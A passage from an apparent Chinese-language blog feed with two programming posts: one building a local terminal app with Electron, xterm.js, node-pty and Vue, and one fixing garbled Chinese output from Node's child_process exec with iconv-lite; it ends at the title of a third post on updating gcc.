  </entry>
  
  
  
  <entry>
    <title>Electron + xterm.js + node-pty + vue 实现本地终端</title>
    <link href="/2022/08/newpost-48/"/>
    <url>/2022/08/newpost-48/</url>
    
    <content type="html"><![CDATA[<p>本文介绍一种简单方法，实现本地终端程序。</p><span id="more"></span><p>项目已上传Github <a href="https://github.com/dr34m-cn/electron-term-demo">https://github.com/dr34m-cn/electron-term-demo</a></p><h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><h4 id="服务提供处：background-js"><a href="#服务提供处：background-js" class="headerlink" title="服务提供处：background.js"></a>服务提供处：<code>background.js</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs js">...<br><br><span class="hljs-keyword">import</span> &#123;<br>    app,<br>    protocol,<br>    <span class="hljs-title class_">BrowserWindow</span>,<br>    ipcMain<br>&#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;electron&#x27;</span><br><br><span class="hljs-keyword">const</span> pty = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;node-pty&quot;</span>);<br><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;os&quot;</span>);<br><span class="hljs-keyword">const</span> shell = os.<span class="hljs-title function_">platform</span>() === <span class="hljs-string">&quot;win32&quot;</span> ? <span class="hljs-string">&quot;powershell.exe&quot;</span> : <span class="hljs-string">&quot;bash&quot;</span>;<br><br>...<br><br><span class="hljs-comment">// 创建终端</span><br>ipcMain.<span class="hljs-title function_">handle</span>(<span class="hljs-string">&quot;terminal-create&quot;</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> term = pty.<span class="hljs-title function_">spawn</span>(shell, [], &#123;<br>        <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;xterm-color&quot;</span>,<br>        <span class="hljs-attr">cwd</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">PWD</span>,<br>        <span class="hljs-attr">env</span>: process.<span class="hljs-property">env</span><br>    &#125;);<br>    <span class="hljs-keyword">const</span> pid = term.<span class="hljs-property">pid</span>;<br>    <span class="hljs-keyword">const</span> channels = [<span class="hljs-string">&quot;terminal-incomingData-&quot;</span> + pid, <span class="hljs-string">&quot;terminal-keystroke-&quot;</span> + pid, <span class="hljs-string">&quot;terminal-resize-&quot;</span> + pid, <span class="hljs-string">&quot;terminal-close-&quot;</span> + pid];<br>    <span class="hljs-comment">// 命令反馈</span><br>    term.<span class="hljs-title function_">onData</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>            win.<span class="hljs-property">webContents</span>.<span class="hljs-title function_">send</span>(channels[<span class="hljs-number">0</span>], data);<br>        &#125;)<br>        <span class="hljs-comment">// 命令输入</span><br>    ipcMain.<span class="hljs-title function_">on</span>(channels[<span class="hljs-number">1</span>], <span class="hljs-function">(<span class="hljs-params">event, key</span>) =&gt;</span> &#123;<br>        term.<span class="hljs-title function_">write</span>(key);<br>    &#125;);<br>    <span class="hljs-comment">// 尺寸调整</span><br>    ipcMain.<span class="hljs-title function_">on</span>(channels[<span class="hljs-number">2</span>], <span class="hljs-function">(<span class="hljs-params">event, cols, rows</span>) =&gt;</span> &#123;<br>        term.<span class="hljs-title function_">resize</span>(cols, rows);<br>    &#125;);<br>    <span class="hljs-comment">// 终端关闭</span><br>    ipcMain.<span class="hljs-title function_">on</span>(channels[<span class="hljs-number">3</span>], <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>        term.<span class="hljs-title function_">kill</span>();<br>        ipcMain.<span class="hljs-title function_">removeAllListeners</span>([channels[<span class="hljs-number">1</span>], channels[<span class="hljs-number">2</span>], channels[<span class="hljs-number">3</span>]]);<br>    &#125;);<br>    <span class="hljs-keyword">return</span> pid;<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="封装处：term-vue"><a href="#封装处：term-vue" class="headerlink" title="封装处：term.vue"></a>封装处：<code>term.vue</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;term&quot;</span> <span class="hljs-attr">:id</span>=<span class="hljs-string">&quot;&#x27;terminal&#x27; + id&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;xterm/css/xterm.css&#x27;</span>;</span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> ipc = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;electron&quot;</span>).<span class="hljs-property">ipcRenderer</span>;</span><br><span class="language-javascript">    <span class="hljs-keyword">import</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-title class_">Terminal</span></span><br><span class="language-javascript">    &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;xterm&#x27;</span>;</span><br><span class="language-javascript">    <span class="hljs-keyword">import</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-title class_">FitAddon</span></span><br><span class="language-javascript">    &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;xterm-addon-fit&#x27;</span>;</span><br><span class="language-javascript">    <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">props</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-attr">id</span>: &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">type</span>: <span class="hljs-title class_">Number</span></span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">showFlag</span>: &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">type</span>: <span class="hljs-title class_">Boolean</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">watch</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-attr">showFlag</span>: &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">handler</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">newVal, oldVal</span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">fitSize</span>();</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-attr">immediate</span>: <span class="hljs-literal">true</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Term&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">xterm</span>: <span class="hljs-literal">null</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">fitAddon</span>: <span class="hljs-literal">null</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">channels</span>: <span class="hljs-literal">null</span></span><br><span class="language-javascript">            &#125;;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-title function_">beforeDestroy</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">destoryTerm</span>();</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-title function_">mounted</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">initConnect</span>();</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">initConnect</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">destoryTerm</span>();</span><br><span class="language-javascript">                <span class="hljs-keyword">let</span> that = <span class="hljs-variable language_">this</span>;</span><br><span class="language-javascript">                ipc.<span class="hljs-title function_">invoke</span>(<span class="hljs-string">&#x27;terminal-create&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;</span><br><span class="language-javascript">                    <span class="hljs-keyword">let</span> pid = res;</span><br><span class="language-javascript">                    <span class="hljs-keyword">let</span> xterm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Terminal</span>();</span><br><span class="language-javascript">                    <span class="hljs-keyword">let</span> fitAddon = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FitAddon</span>();</span><br><span class="language-javascript">                    xterm.<span class="hljs-title function_">loadAddon</span>(fitAddon);</span><br><span class="language-javascript">                    xterm.<span class="hljs-title function_">open</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;terminal&#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span>));</span><br><span class="language-javascript">                    that.<span class="hljs-property">xterm</span> = xterm;</span><br><span class="language-javascript">                    that.<span class="hljs-property">fitAddon</span> = fitAddon;</span><br><span class="language-javascript">                    that.<span class="hljs-property">channels</span> = [<span class="hljs-string">&quot;terminal-incomingData-&quot;</span> + pid, <span class="hljs-string">&quot;terminal-keystroke-&quot;</span> + pid, <span class="hljs-string">&quot;terminal-resize-&quot;</span> + pid, <span class="hljs-string">&quot;terminal-close-&quot;</span> + pid];</span><br><span class="language-javascript">                    xterm.<span class="hljs-title function_">onData</span>(<span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">                        ipc.<span class="hljs-title function_">send</span>(that.<span class="hljs-property">channels</span>[<span class="hljs-number">1</span>], data);</span><br><span class="language-javascript">                    &#125;)</span><br><span class="language-javascript">                    xterm.<span class="hljs-title function_">onResize</span>(<span class="hljs-function">(<span class="hljs-params">size</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">                        ipc.<span class="hljs-title function_">send</span>(that.<span class="hljs-property">channels</span>[<span class="hljs-number">2</span>], size.<span class="hljs-property">cols</span>, size.<span class="hljs-property">rows</span>);</span><br><span class="language-javascript">                    &#125;)</span><br><span class="language-javascript">                    ipc.<span class="hljs-title function_">on</span>(that.<span class="hljs-property">channels</span>[<span class="hljs-number">0</span>], <span class="hljs-function">(<span class="hljs-params">event, data</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">                        xterm.<span class="hljs-title function_">write</span>(data);</span><br><span class="language-javascript">                    &#125;);</span><br><span class="language-javascript">                    <span class="hljs-variable language_">window</span>.<span class="hljs-property">onresize</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                        that.<span class="hljs-title function_">fitSize</span>();</span><br><span class="language-javascript">                    &#125;</span><br><span class="language-javascript">                    that.<span class="hljs-title function_">fitSize</span>();</span><br><span class="language-javascript">                    xterm.<span class="hljs-title function_">focus</span>();</span><br><span class="language-javascript">                &#125;)</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-title function_">destoryTerm</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">xterm</span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">xterm</span>.<span class="hljs-title function_">dispose</span>();</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">xterm</span> = <span class="hljs-literal">null</span>;</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">                <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">fitAddon</span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fitAddon</span>.<span class="hljs-title function_">dispose</span>();</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fitAddon</span> = <span class="hljs-literal">null</span>;</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">                <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">channels</span>) &#123;</span><br><span class="language-javascript">                    ipc.<span class="hljs-title function_">send</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">channels</span>[<span class="hljs-number">3</span>]);</span><br><span class="language-javascript">                    ipc.<span class="hljs-title function_">removeAllListeners</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">channels</span>[<span class="hljs-number">0</span>]);</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">channels</span> = <span class="hljs-literal">null</span>;</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-title function_">fitSize</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">showFlag</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">fitAddon</span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fitAddon</span>.<span class="hljs-title function_">fit</span>();</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="调用处：App-vue"><a href="#调用处：App-vue" class="headerlink" title="调用处：App.vue"></a>调用处：<code>App.vue</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">term</span> <span class="hljs-attr">:id</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">:showFlag</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;term&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">term</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">import</span> term <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@/components/term&#x27;</span></span><br><span class="language-javascript">    <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;App&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">components</span>: &#123;</span><br><span class="language-javascript">            term</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> &#123;&#125;;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-title function_">created</span>(<span class="hljs-params"></span>) &#123;&#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>: &#123;&#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-tag">body</span> &#123;</span><br><span class="language-css">    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;</span><br><span class="language-css">    <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;</span><br><span class="language-css">    <span class="hljs-attribute">background</span>: <span class="hljs-number">#000000</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css"><span class="hljs-selector-class">.term</span> &#123;</span><br><span class="language-css">    <span class="hljs-attribute">width</span>: <span class="hljs-number">100vw</span>;</span><br><span class="language-css">    <span class="hljs-attribute">height</span>: <span class="hljs-number">100vh</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css">::-webkit-scrollbar &#123;</span><br><span class="language-css">    <span class="hljs-comment">/*滚动条整体样式*/</span></span><br><span class="language-css">    <span class="hljs-attribute">width</span>: <span class="hljs-number">10px</span>;</span><br><span class="language-css">    <span class="hljs-comment">/*高宽分别对应横竖滚动条的尺寸*/</span></span><br><span class="language-css">    <span class="hljs-attribute">height</span>: <span class="hljs-number">10px</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><br><span class="language-css">::-webkit-scrollbar-thumb &#123;</span><br><span class="language-css">    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#FFF</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><br><span class="language-css">::-webkit-scrollbar-track &#123;</span><br><span class="language-css">    <span class="hljs-comment">/*滚动条里面轨道*/</span></span><br><span class="language-css">    <span class="hljs-attribute">background</span>: <span class="hljs-number">#000</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="推荐版本nodejs-14-X"><a href="#推荐版本nodejs-14-X" class="headerlink" title="推荐版本nodejs 14.X"></a>推荐版本nodejs 14.X</h4><p>需要满足<a href="https://github.com/microsoft/node-pty#dependencies">node-pty使用依赖</a>，摘录在最后</p><h3 id="启动方式："><a href="#启动方式：" class="headerlink" title="启动方式："></a>启动方式：</h3><h4 id="首次"><a href="#首次" class="headerlink" title="首次"></a>首次</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install<br>npm run rebuild<br>npm run serve<br></code></pre></td></tr></table></figure><h4 id="之后"><a href="#之后" class="headerlink" title="之后"></a>之后</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm run serve<br></code></pre></td></tr></table></figure><h3 id="效果如下"><a href="#效果如下" class="headerlink" title="效果如下"></a>效果如下</h3><img src="/2022/08/newpost-48/electron-term-demo.png" class="" title="QQ截图20220825163525"><h3 id="node-pty使用依赖摘录如下"><a href="#node-pty使用依赖摘录如下" class="headerlink" title="node-pty使用依赖摘录如下"></a><a href="https://github.com/microsoft/node-pty#dependencies">node-pty使用依赖</a>摘录如下</h3><blockquote><h2 id="Dependencies"><a href="#Dependencies" class="headerlink" title="Dependencies"></a>Dependencies</h2><p>Node.JS 12+ or Electron 8+ is required to use <code>node-pty</code>.</p><h3 id="Linux-apt"><a href="#Linux-apt" class="headerlink" title="Linux (apt)"></a>Linux (apt)</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> apt install -y make python build-essential<br></code></pre></td></tr></table></figure><h3 id="macOS"><a href="#macOS" class="headerlink" title="macOS"></a>macOS</h3><p>Xcode is needed to compile the sources, this can be installed from the App Store.</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p><code>npm install</code> requires some tools to be present in the system like Python and C++ compiler. Windows users can easily install them by running the following command in PowerShell as administrator. For more information see <a href="https://github.com/felixrieseberg/windows-build-tools">https://github.com/felixrieseberg/windows-build-tools</a>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">npm install --global --production windows-build-tools<br></code></pre></td></tr></table></figure><p>The following are also needed:</p><ul><li><a href="https://developer.microsoft.com/en-us/windows/downloads/windows-10-sdk">Windows SDK</a> - only the “Desktop C++ Apps” components are needed to be installed</li></ul></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>前端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>child_process exec 中文乱码 Windows&amp;Linux 解决方法</title>
    <link href="/2022/08/newpost-47/"/>
    <url>/2022/08/newpost-47/</url>
    
    <content type="html"><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>在Windows&amp;Linux中，Mac理论也可以，执行child_process exec时，中文可以正常显示。</p><span id="more"></span><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h3 id="1-安装iconv-lite"><a href="#1-安装iconv-lite" class="headerlink" title="1. 安装iconv-lite"></a>1. 安装<code>iconv-lite</code></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install iconv-lite -S<br></code></pre></td></tr></table></figure><h3 id="2-具体代码"><a href="#2-具体代码" class="headerlink" title="2. 具体代码"></a>2. 具体代码</h3><p><code>runExec.js</code>内容</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> exec = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">exec</span>;<br><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;os&quot;</span>);<br><span class="hljs-keyword">const</span> iconv = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;iconv-lite&#x27;</span>);<br><span class="hljs-keyword">const</span> encoding = os.<span class="hljs-title function_">platform</span>() == <span class="hljs-string">&#x27;win32&#x27;</span> ? <span class="hljs-string">&#x27;cp936&#x27;</span> : <span class="hljs-string">&#x27;utf-8&#x27;</span>;<br><span class="hljs-keyword">const</span> binaryEncoding = <span class="hljs-string">&#x27;binary&#x27;</span>;<br><span class="hljs-comment">// 执行命令并获取结果</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">runExec</span> = (<span class="hljs-params">cmd</span>) =&gt; &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>        <span class="hljs-title function_">exec</span>(cmd, &#123; <span class="hljs-attr">encoding</span>: binaryEncoding &#125;, <span class="hljs-keyword">function</span>(<span class="hljs-params">error, stdout, stderr</span>) &#123;<br>            <span class="hljs-keyword">if</span> (error) &#123;<br>                <span class="hljs-title function_">reject</span>(iconv.<span class="hljs-title function_">decode</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Buffer</span>(error.<span class="hljs-property">message</span>, binaryEncoding), encoding));<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-title function_">resolve</span>(iconv.<span class="hljs-title function_">decode</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Buffer</span>(stdout, binaryEncoding), encoding));<br>            &#125;<br>        &#125;);<br>    &#125;)<br>&#125;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> runExec<br></code></pre></td></tr></table></figure><p>调用方</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> runExec <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;runExec.js&#x27;</span><br><span class="hljs-title function_">runExec</span>(<span class="hljs-string">&#x27;echo &quot;中文测试&quot;&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;执行成功&#x27;</span>, res);<br>&#125;).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;执行失败&#x27;</span>, err);<br>&#125;)<br></code></pre></td></tr></table></figure><p>亲测在<code>Windows 11</code>和<code>Kali Linux</code>下都能正常显示中文，其他系统如有不支持，只需更改<code>encoding</code>即可</p>]]></content>
    
    
    
    <tags>
      
      <tag>前端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>yum 更新 gcc</title>
    <link href="/2022/06/newpost-46/"/>
    <url>/2022/06/newpost-46/</url>
    
